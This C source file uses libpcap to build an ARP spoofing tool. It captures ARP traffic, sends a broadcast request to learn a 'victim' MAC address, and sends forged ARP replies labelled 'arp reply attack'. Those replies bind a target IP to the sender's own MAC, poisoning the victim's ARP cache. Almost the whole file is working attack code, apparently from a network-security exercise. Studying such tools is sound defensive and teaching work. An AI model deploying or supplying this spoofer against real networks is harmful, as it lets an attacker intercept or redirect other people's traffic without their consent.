#include <pcap/pcap.h>
#include "pcapFunction.h"

//open pcap handler
int init_handle(pcap_arg *arg, char *network)
{
    char errbuf[PCAP_ERRBUF_SIZE];

    if(network == nullptr)
    {
        printf("Can not find device!!");

        return RET_ERROR;
    }

    //capture network device
    arg->hand = pcap_open_live(network, BUFSIZ, 1, 1000, errbuf);
    if(arg->hand == nullptr)
    {
        printf(" Can not open device!!");
        return RET_ERROR;
    }

    return RET_SUCCESS;
}

//set handle arp
int set_handle_arp(pcap_arg *arg)
{
    //arp filltering
    struct bpf_program filter;

    //only capture arp, save in filter
    if(pcap_compile(arg->hand, &filter, "arp", 1, arg->net) == -1)
    {
        printf("Can not set handle arp!!");
        return RET_ERROR;
    }

    //install arp filter, save in arg
    if(pcap_setfilter(arg->hand, &filter) == -1)
    {
        printf("Can not install pcap fillter!!");
        return RET_ERROR;
    }

    return RET_SUCCESS;
}
//close pcap handler
int close_handle(pcap_arg *arg)
{
    pcap_close(arg->hand);
    return RET_SUCCESS;
}

//send arp request

/*
 *1. GET target Mac Address
 *
 *
 * shost: my Mac Address
 * dhost: ff ff ff ff ff ff
 * etype: ARP
 *
 * opcode: request
 *
 * sender hw addr: My  MAC Address
 * sender pt addr: MY IP Address
 * target hw addr : 00 00 00 00 00 00 00
 * target pt addr : Victim IP Address
 *
 *
 */
int send_arp_request(pcap_arg *arg, char *addr_s)
{
    struct ether_header ehdr;
    struct arp_header ahdr;
    struct in_addr addr;

    //Destination Host: ff-ff-ff-ff-ff-ff  = ethernet broadcast
    //Source Host: My Mac Address
    memset(ehdr.ether_dhost, 0xff, MAC_ADDRESS_LEN);
    memcpy(ehdr.ether_shost, arg->mac_address, MAC_ADDRESS_LEN);

    //packet type ID field = ARP
    ehdr.ether_type = htons(ETHERTYPE_ARP);

    ahdr.op = htons(ARP_REQUEST);

    //sender Hdware, Protocol
    //sender hw : my Mac Address
    //sender ip: my IP Address
    memcpy(ahdr.sender_HW_Addr, arg->mac_address,MAC_ADDRESS_LEN);
    memcpy(ahdr.sender_protocol_addr, &(arg->local_ip), IP_ADDRESS_LEN);

    //target Hdware, Protocol
    //target mac: 00-00-00-00-00-00  =  i don' know, i want to know your mac addr
    memset(ahdr.target_HW_Addr, 0x00,MAC_ADDRESS_LEN);

    //change 192.168.x.x => binary, into addr
    inet_pton(AF_INET, addr_s, &addr);

    //target ip: vicitim ip
    memcpy(ahdr.target_Protocol_Addr, &addr, IP_ADDRESS_LEN);


    //save victim ip in arg
    memcpy(&(arg->sender_ip), &addr, sizeof (struct in_addr));





    //send arp packet
    if(send_arp_packet(arg, &ehdr, &ahdr))
    {
        return RET_ERROR;
    }

    return RET_SUCCESS;
}

//send arp reply
/*
 *
 * 2. arp reply attack
 *
 *
 *
 * shost: my MAC Address
 * dhost: victim MAC Address
 *
 *
 * etype: ARP
 *
 * opcode : reply
 *
 * sender hw addr: my MAC Address
 * sender pt addr: target ip address
 *
 *
 * target hw addr: victim MAC Address
 * target pt addr: victim ip address
 *
 *
 */
int send_arp_reply(pcap_arg *arg, struct arp_header *ahdr, char *addr_t)
{
    struct ether_header ehdr;
    struct arp_header arp_hdr;
    struct in_addr addr;

    //Destination host: my mac
    //Source host: vicitim mac
    memcpy(ehdr.ether_shost,arg->mac_address, MAC_ADDRESS_LEN);
    memcpy(ehdr.ether_dhost, ahdr->sender_HW_Addr, MAC_ADDRESS_LEN);

    //type: arp
    ehdr.ether_type = htons(ETHERTYPE_ARP);

    //opcode: arp reply
    arp_hdr.op = htons(ARP_REPLY);


    //sender hw addr: my mac
    //sender protocol addr: target ip
    memcpy(arp_hdr.sender_HW_Addr, arg->mac_address, MAC_ADDRESS_LEN);

    //change ip binary
    inet_pton(AF_INET,addr_t, &addr);


    memcpy(arp_hdr.sender_protocol_addr, &addr, IP_ADDRESS_LEN);
    memcpy(arp_hdr.target_HW_Addr, ahdr->sender_HW_Addr, MAC_ADDRESS_LEN);
    memcpy(arp_hdr.target_Protocol_Addr, ahdr->sender_protocol_addr, IP_ADDRESS_LEN);

    if(send_arp_packet(arg, &ehdr, &arp_hdr))
    {
        return RET_ERROR;
    }

    return  RET_SUCCESS;

}

//send arp packet
int send_arp_packet(pcap_arg *arg, struct ether_header *ehdr, struct arp_header *ahdr)
{

    // i'll send ethernet, arp header
    u_char frame[ETH_HEADER_LEN + ARP_HEADER_LEN];

    // ethernet header into frame
    get_ethernet(frame, ehdr);

    //add arp header into frame
    get_arp(frame + ETH_HEADER_LEN, ahdr);

    printf("\n");

    //send using handler
    if(pcap_sendpacket(arg->hand,frame, sizeof (frame)) == -1)
    {
        printf("pcap_sendpacket error!!");
        return RET_ERROR;
    }

    return RET_SUCCESS;


}

//received arp packet
int recv_arp_packet(pcap_arg *arg, struct arp_header *ahdr)
{

    struct pcap_pkthdr *header;
    const u_char *frame, *packet;

    //check packet
    int ret_next;
    int i;

    for (i =0; i< RECV_ITER_N;i++)
    {

        ret_next = pcap_next_ex(arg->hand, &header, &frame);

        if(ret_next == 0)
        {
            printf("timeout");
            continue;
        }
        if (ret_next !=1)
        {
            printf ("pcap next error!!");
            return RET_ERROR;
        }

        if(frame == nullptr)
        {
            printf("Could not get packet");
        }


        //save into arp header
        if(parsing_ethernet(frame))
        {

            memset(ahdr,0, sizeof (struct arp_header));

            //packet start arp header
            packet = frame + ETH_HEADER_LEN;

            //put arp header
            parsing_arp(packet, ahdr);

            // same arp header ip, sender ip?
            if(!memcmp(&(ahdr->sender_protocol_addr), &(arg->sender_ip), sizeof (struct in_addr)))
            {
                return RET_SUCCESS;
            }
            else {
                printf("received unwanted reply packet");
                printf("=============================================\n");
                continue;

            }

        }
        else {
            printf("arp filter has problem");
            return RET_ERROR;
        }

    }

    printf("received: could not find sender!!");
    return RET_ERROR;
}
